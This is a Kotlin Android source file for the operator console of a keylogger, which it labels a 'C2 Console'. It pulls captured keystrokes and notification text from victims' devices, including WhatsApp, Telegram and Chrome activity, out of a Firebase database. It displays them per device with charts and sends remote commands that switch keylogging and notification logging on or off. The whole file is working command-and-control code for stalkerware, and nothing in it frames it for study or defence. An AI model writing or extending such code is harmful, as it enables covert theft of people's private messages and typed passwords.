package com.example.mykeyboardadmin

import android.graphics.Color
import android.os.Bundle
import android.text.method.ScrollingMovementMethod
import android.view.LayoutInflater
import android.view.MotionEvent
import android.view.View
import android.view.ViewGroup
import android.widget.Button
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.recyclerview.widget.LinearLayoutManager
import androidx.recyclerview.widget.RecyclerView
import com.google.firebase.FirebaseApp
import com.google.firebase.database.DataSnapshot
import com.google.firebase.database.DatabaseError
import com.google.firebase.database.FirebaseDatabase
import com.google.firebase.database.ValueEventListener
import java.text.SimpleDateFormat
import java.util.Calendar
import java.util.Date
import java.util.Locale

class AdminMainActivity : AppCompatActivity() {

    private lateinit var recyclerView: RecyclerView
    private lateinit var txtTotalDevices: TextView
    private lateinit var txtTotalEvents: TextView
    private lateinit var horizontalBarChartView: HorizontalBarChartView
    private lateinit var lineChartView: LineChartView

    private val deviceList = mutableListOf<DeviceModel>()
    private lateinit var adapter: DeviceAdapter
    private val DB_URL = "https://key-lo-5811c-default-rtdb.firebaseio.com"

    data class DeviceModel(
        val name: String,
        var keylogging: Boolean = true,
        var notifications: Boolean = true,
        var logFeed: String = "Waiting for telemetry...",
        val appCounts: MutableMap<String, Int> = mutableMapOf()
    )

    data class LogEntry(
        val timestamp: Long,
        val appName: String,
        val text: String
    )

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        try {
            FirebaseApp.initializeApp(this)
        } catch (e: Exception) {
            e.printStackTrace()
        }
        setContentView(R.layout.activity_admin_main)

        txtTotalDevices = findViewById<TextView>(R.id.txtTotalDevices)
        txtTotalEvents = findViewById<TextView>(R.id.txtTotalEvents)
        horizontalBarChartView = findViewById<HorizontalBarChartView>(R.id.horizontalBarChartView)
        lineChartView = findViewById<LineChartView>(R.id.lineChartView)

        val btnRefresh = findViewById<Button>(R.id.btnRefreshDevices)
        btnRefresh.setOnClickListener {
            loadConnectedDevices()
            Toast.makeText(this, "C2 Console synced!", Toast.LENGTH_SHORT).show()
        }

        recyclerView = findViewById<RecyclerView>(R.id.recyclerViewDevices)
        recyclerView.layoutManager = LinearLayoutManager(this)
        adapter = DeviceAdapter(deviceList) { device, type, newState ->
            val ref = FirebaseDatabase.getInstance(DB_URL).getReference("admin_commands").child(device.name)
            if (type == "key") {
                device.keylogging = newState
                ref.child("keylogging").setValue(newState)
                ref.child("status").child("keylogging").setValue(newState)
            } else {
                device.notifications = newState
                ref.child("notifications").setValue(newState)
                ref.child("status").child("notifications").setValue(newState)
            }
            adapter.notifyDataSetChanged()
            Toast.makeText(this, "Command sent to ${device.name}", Toast.LENGTH_SHORT).show()
        }
        recyclerView.adapter = adapter

        loadConnectedDevices()
    }

    private fun loadConnectedDevices() {
        val dbRef = FirebaseDatabase.getInstance(DB_URL).getReference("keystrokes_batches")
        dbRef.addValueEventListener(object : ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                val allEntries = mutableListOf<LogEntry>()
                val globalAppCounts = mutableMapOf<String, Int>()
                val hourlyCounts = FloatArray(24) { 0f }
                val calendar = Calendar.getInstance()
                val todayDayOfYear = calendar.get(Calendar.DAY_OF_YEAR)

                for (child in snapshot.children) {
                    val deviceName = child.key ?: continue
                    if (deviceList.none { it.name == deviceName }) {
                        val device = DeviceModel(deviceName)
                        deviceList.add(device)
                        listenToDeviceState(deviceName)
                        listenToDeviceLogs(deviceName)
                    }
                    for (appChild in child.children) {
                        val rawApp = appChild.key ?: continue
                        val prettyApp = getPrettyAppName(rawApp)
                        for (entry in appChild.children) {
                            val text = entry.child("text").getValue(String::class.java)
                                ?: entry.child("title").getValue(String::class.java)
                                ?: entry.child("typedContent").getValue(String::class.java)
                                ?: continue

                            val timestampMillis = entry.child("timestamp").getValue(Long::class.java) ?: System.currentTimeMillis()
                            if (text.isNotBlank() && text != "null") {
                                allEntries.add(LogEntry(timestampMillis, prettyApp, text))
                                globalAppCounts[prettyApp] = (globalAppCounts[prettyApp] ?: 0) + 1

                                calendar.timeInMillis = timestampMillis
                                if (calendar.get(Calendar.DAY_OF_YEAR) == todayDayOfYear) {
                                    val hour = calendar.get(Calendar.HOUR_OF_DAY)
                                    if (hour in 0..23) {
                                        hourlyCounts[hour]++
                                    }
                                }
                            }
                        }
                    }
                }

                txtTotalDevices.text = deviceList.size.toString()
                txtTotalEvents.text = allEntries.size.toString()
                adapter.notifyDataSetChanged()

                // Update Global Horizontal Bar Chart
                val globalBarChartData = globalAppCounts.entries.sortedByDescending { it.value }.map { it.key to it.value }
                horizontalBarChartView.setData(globalBarChartData)

                // Update Line Chart for Today's Activity Trend
                val chartPoints = hourlyCounts.toList()
                val timeLabels = listOf("12AM", "3AM", "6AM", "9AM", "12PM", "3PM", "6PM", "9PM")
                lineChartView.setData(chartPoints, timeLabels)
            }

            override fun onCancelled(error: DatabaseError) {}
        })
    }

    private fun listenToDeviceState(deviceName: String) {
        val cmdRef = FirebaseDatabase.getInstance(DB_URL).getReference("admin_commands").child(deviceName)
        
        cmdRef.child("keylogging").get().addOnSuccessListener { 
            if (!it.exists()) cmdRef.child("keylogging").setValue(true) 
        }
        cmdRef.child("notifications").get().addOnSuccessListener { 
            if (!it.exists()) cmdRef.child("notifications").setValue(true) 
        }

        cmdRef.addValueEventListener(object : ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                val keyObj = snapshot.child("status").child("keylogging").value
                    ?: snapshot.child("keylogging").value
                val key = when (keyObj) {
                    is Boolean -> keyObj
                    is String -> keyObj.toBoolean()
                    else -> true
                }

                val notifObj = snapshot.child("status").child("notifications").value
                    ?: snapshot.child("notifications").value
                val notif = when (notifObj) {
                    is Boolean -> notifObj
                    is String -> notifObj.toBoolean()
                    else -> true
                }

                val index = deviceList.indexOfFirst { it.name == deviceName }
                if (index != -1) {
                    deviceList[index].keylogging = key
                    deviceList[index].notifications = notif
                    adapter.notifyItemChanged(index)
                }
            }

            override fun onCancelled(error: DatabaseError) {}
        })
    }

    private fun getPrettyAppName(pkg: String): String {
        return when {
            pkg.contains("whatsapp", true) -> "WhatsApp"
            pkg.contains("chrome", true) -> "Chrome"
            pkg.contains("youtube", true) -> "YouTube"
            pkg.contains("instagram", true) -> "Instagram"
            pkg.contains("dialer", true) -> "Phone"
            pkg.contains("telegram", true) -> "Telegram"
            pkg.contains("settings", true) -> "Settings"
            else -> pkg.substringAfterLast('.')
        }
    }

    private fun listenToDeviceLogs(deviceName: String) {
        val logRef = FirebaseDatabase.getInstance(DB_URL).getReference("keystrokes_batches").child(deviceName)
        logRef.addValueEventListener(object : ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                val entries = mutableListOf<Triple<Long, String, String>>()
                val deviceAppCounts = mutableMapOf<String, Int>()
                val timeFormat = SimpleDateFormat("HH:mm:ss", Locale.getDefault())

                for (appChild in snapshot.children) {
                    val rawApp = appChild.key ?: continue
                    val prettyApp = getPrettyAppName(rawApp)
                    for (entry in appChild.children) {
                        val text = entry.child("text").getValue(String::class.java)
                            ?: entry.child("title").getValue(String::class.java)
                            ?: entry.child("typedContent").getValue(String::class.java)
                            ?: continue

                        val timestampMillis = entry.child("timestamp").getValue(Long::class.java) ?: System.currentTimeMillis()

                        if (text.isNotBlank() && text != "null") {
                            entries.add(Triple(timestampMillis, prettyApp, text))
                            deviceAppCounts[prettyApp] = (deviceAppCounts[prettyApp] ?: 0) + 1
                        }
                    }
                }

                // Sort newest on top
                entries.sortByDescending { it.first }

                val sb = StringBuilder()
                for (item in entries) {
                    val timeStr = timeFormat.format(Date(item.first))
                    sb.append("[$timeStr] ${item.second}: ${item.third}\n")
                }

                val index = deviceList.indexOfFirst { it.name == deviceName }
                if (index != -1) {
                    deviceList[index].logFeed = if (sb.isNotEmpty()) sb.toString() else "No telemetry recorded yet."
                    deviceList[index].appCounts.clear()
                    deviceList[index].appCounts.putAll(deviceAppCounts)
                    adapter.notifyItemChanged(index)
                }
            }

            override fun onCancelled(error: DatabaseError) {}
        })
    }

    class DeviceAdapter(
        private val devices: List<DeviceModel>,
        private val onToggle: (DeviceModel, String, Boolean) -> Unit
    ) : RecyclerView.Adapter<DeviceAdapter.ViewHolder>() {

        class ViewHolder(view: View) : RecyclerView.ViewHolder(view) {
            val txtName: TextView = view.findViewById<TextView>(R.id.txtDeviceName)
            val btnKey: Button = view.findViewById<Button>(R.id.btnToggleKeyLog)
            val btnNotif: Button = view.findViewById<Button>(R.id.btnToggleNotifLog)
            val txtLog: TextView = view.findViewById<TextView>(R.id.txtDeviceLogConsole)
            val scrollView: View = view.findViewById<View>(R.id.logScrollView)
            val deviceBarChart: HorizontalBarChartView = view.findViewById<HorizontalBarChartView>(R.id.deviceBarChart)
        }

        override fun onCreateViewHolder(parent: ViewGroup, viewType: Int): ViewHolder {
            val view = LayoutInflater.from(parent.context).inflate(R.layout.item_device_control, parent, false)
            return ViewHolder(view)
        }

        override fun onBindViewHolder(holder: ViewHolder, position: Int) {
            val device = devices[position]
            holder.txtName.text = "📱 Device: ${device.name}"

            if (device.keylogging) {
                holder.btnKey.text = "Key Logger: ON"
                holder.btnKey.setBackgroundColor(Color.parseColor("#388E3C"))
            } else {
                holder.btnKey.text = "Key Logger: OFF"
                holder.btnKey.setBackgroundColor(Color.parseColor("#C62828"))
            }

            if (device.notifications) {
                holder.btnNotif.text = "Notif Logger: ON"
                holder.btnNotif.setBackgroundColor(Color.parseColor("#388E3C"))
            } else {
                holder.btnNotif.text = "Notif Logger: OFF"
                holder.btnNotif.setBackgroundColor(Color.parseColor("#C62828"))
            }

            // Set individual device chart data
            val barData = device.appCounts.entries.sortedByDescending { it.value }.map { it.key to it.value }
            holder.deviceBarChart.setData(barData)

            holder.scrollView.setOnTouchListener { v, event ->
                when (event.action) {
                    MotionEvent.ACTION_DOWN, MotionEvent.ACTION_MOVE -> {
                        v.parent.requestDisallowInterceptTouchEvent(true)
                    }
                    MotionEvent.ACTION_UP -> {
                        v.parent.requestDisallowInterceptTouchEvent(false)
                    }
                }
                false
            }
            holder.txtLog.movementMethod = ScrollingMovementMethod()
            holder.txtLog.text = device.logFeed

            holder.btnKey.setOnClickListener {
                onToggle(device, "key", !device.keylogging)
            }

            holder.btnNotif.setOnClickListener {
                onToggle(device, "notif", !device.notifications)
            }
        }

        override fun getItemCount() = devices.size
    }
}
